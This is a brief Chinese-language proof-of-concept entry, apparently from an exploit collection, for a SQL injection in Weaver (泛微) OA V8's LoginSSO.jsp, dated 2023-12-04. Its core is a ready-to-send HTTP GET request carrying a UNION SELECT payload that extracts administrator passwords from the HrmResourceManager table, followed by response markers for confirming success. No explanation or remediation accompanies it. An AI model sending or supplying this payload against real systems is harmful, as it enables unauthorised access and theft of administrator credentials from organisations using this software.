﻿# 泛微 OA V8 LoginSSO.jsp 注入

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：泛微 OA V8 LoginSSO.jsp 注入

> 漏洞特征：

> 验证脚本：HTTP

```
GET /upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20password%20as%20id%20from%20HrmResourceManager HTTP/1.1
```

> 响应代码特征：200

> 响应内容特征：code

> 上传文件定位：

> 验证文件来源：泛微 OA V8 LoginSSO.jsp 注入.poc
